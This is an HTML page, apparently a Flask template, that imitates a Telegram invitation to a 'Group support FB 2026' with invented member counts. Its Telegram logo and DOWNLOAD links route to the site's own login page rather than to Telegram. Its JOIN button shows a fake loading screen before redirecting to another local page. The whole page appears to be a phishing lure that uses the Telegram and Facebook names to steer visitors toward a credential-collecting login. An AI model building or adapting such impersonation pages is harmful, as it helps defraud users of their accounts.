<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Telegram: Join group Support FB</title>

    <meta property="og:title" content="Join group Support FB" />
    <meta property="og:description" content="Join now group Support FB" />
    <meta property="og:image" content="" />
    <meta property="og:type" content="website" />

    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
    />
    <style>
      #loading {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        color: white;
        display: none; /* Hide by default */
        justify-content: center;
        align-items: center;
        font-size: 24px;
        z-index: 9999; /* Ensure it covers other content */
      }

      #loading img {
        width: 60px; /* Adjust size as needed */
        height: auto;
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, Helvetica, sans-serif;
      }

      body,
      html {
        height: 100%;
        width: 100%;
      }

      .hero {
        height: 100vh;
        width: 100%;
        background: url(rew.jpg);
        background-size: cover;
        background-position: center;
        position: relative;
        padding-bottom: 0;
        justify-content: center;
        align-items: center;
        padding: 15px;
      }

      @media (max-width: 768px) {
        /* Ubah nilai 768px sesuai kebutuhan */
        .hero {
          background-position: top center; /* Fokus ke bagian atas gambar */
          height: 100vh; /* Tinggi hanya setengah layar */
        }
      }

      nav {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 10px 20px;
        background-color: #212121;
      }

      .logo {
        color: white;
        font-size: 28px;
      }

      .logo span {
        color: #ea1538;
      }

      nav ul {
        display: flex;
        gap: 20px;
        margin-right: 20px;
      }

      nav ul li {
        list-style-type: none;
      }

      nav ul li a {
        color: white;
        text-decoration: none;
        font-weight: bold;
      }

      nav ul li a:hover {
        color: #ea1538;
        transition: 0.3s;
      }

      .navbar-logo {
        width: 50px;
        height: auto;
      }

      .info {
        font-size: 40px;
        color: #fff;
        text-align: center;
        margin: 10px 0 0;
      }

      .info span {
        color: white;
        font-weight: bold;
        outline: #fff;
      }

      h1 {
        display: flex;
        font-size: 14px;
        padding: 15px;
        align-items: center;
        justify-content: center;
        text-align: justify;
      }

      h1 span {
        color: #156aea;
      }

      p {
        font-size: 20px;
        color: white;
        text-align: center;
        margin: 5px 0 5px;
      }

      .container {
        display: flex;
        justify-content: center;
        margin-top: 30px;
      }

      .container-1 {
        display: flex;
        align-items: center;
        justify-content: center;
        margin-top: 70px;
        flex-direction: column;
      }

      .btn-daftar {
        background-color: #156aea;
        color: white;
        font-size: 18px;
        padding: 12px 20px;
        border: none;
        border-radius: 15px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        font-weight: bold;
      }

      .btn-daftar:hover {
        background-color: #0056b3;
      }

      /* Footer */
      footer {
        display: none;
        background-color: #fff;
        padding: 5px;
        text-align: center;
        position: absolute;
        width: 100%;
        bottom: 0;
      }

      footer ul {
        display: flex;
        justify-content: center;
        gap: 20px;
      }

      footer ul li {
        list-style-type: none;
      }

      footer ul li a {
        color: #010101;
        text-decoration: none;
        font-weight: bold;
      }

      footer ul li a:hover {
        color: #ea1538;
        transition: 0.3s;
      }

      /* Responsiveness */
      @media (min-width: 769px) {
        nav ul {
          justify-content: flex-end;
        }
      }

      @media (max-width: 768px) {
        nav ul {
          display: none;
        }

        footer {
          display: block;
        }

        .logo {
          font-size: 24px;
        }

        .info {
          font-size: 20px;
        }

        p {
          font-size: 18px;
        }

        .btn-daftar {
          padding: 12px 18px;
          font-size: 16px;
        }

        .navbar-logo {
          width: 40px;
        }
      }

      @media (max-width: 480px) {
        .logo {
          font-size: 20px;
        }

        .info {
          font-size: 20px;
        }

        .info span {
          outline: #fff;
        }

        p {
          font-size: 16px;
        }

        img[src="jawatan.png"] {
          display: flex;
          width: 70%;
          height: auto;
          /* padding: 40px; */
          padding-top: 250px;
          align-items: center;
          justify-self: center;
        }

        .btn-daftar {
          padding: 12px;
          font-size: 10px;
        }

        .navbar-logo {
          width: 30px;
        }

        .container-1 {
          padding-top: -200px;
        }
      }
    </style>
  </head>
  <body>
    <!-- Loading Screen -->
    <div id="loading">
      <img src="loading-loading-forever.gif" alt="Loading..." />
      <!-- Replace with your GIF -->
    </div>
    <nav>
      <div
        style="
          display: flex;
          gap: 15px;
          justify-content: center;
          align-items: center;
          text-decoration: none;
        "
      >
        <img
          src="Telegram_logo.svg.png"
          alt="image"
          class="navbar-logo"
          style="
            width: 30px;
            height: auto;
            align-items: center;
            justify-content: center;
          "
        />
        <a
          href="{{ url_for('login') }}"
          style="
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            text-decoration: none;
          "
          >Telegram</a
        >
      </div>

      <div
        style="
          display: flex;
          justify-content: center;
          align-items: center;
          background-color: #156aea;
          border-radius: 15px;
          padding: 7px;
        "
      >
        <a
          href="{{ url_for('login') }}"
          style="
            align-items: center;
            text-decoration: none;
            font-size: 12px;
            font-weight: bold;
            color: #fff;
          "
          >DOWNLOAD</a
        >
      </div>
    </nav>
    <div class="hero">
      <div
        style="
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          width: 100%;
          background-color: #212121;
          border-radius: 15px;
          padding: 30px;
          /* margin-top: 10px; */
        "
      >
        <img
          src="banner.png"
          alt="Group Image"
          style="
            width: 120px;
            height: 120px;
            border-radius: 50%;
            object-fit: cover;
          "
        />

        <h3 class="info">Join Group support FB 2026</h3>
        <p style="font-size: 10px; font-weight: 100; color: #c8c8c8">
          5107 members, 378 online
        </p>

        <div class="container">
          <button class="btn-daftar" onclick="showLoading('jawatan.html')">
            JOIN GROUP
          </button>
        </div>
        <p style="font-size: 15px; font-weight: 100; color: #c8c8c8">
          Group support FB 2026
        </p>
      </div>

      <script>
        function showLoading(url) {
          // Show the loading screen
          document.getElementById("loading").style.display = "flex";

          // Redirect to the specified URL after 2 seconds
          setTimeout(function () {
            window.location.href = url;
          }, 2000);
        }
      </script>
    </div>
  </body>
</html>
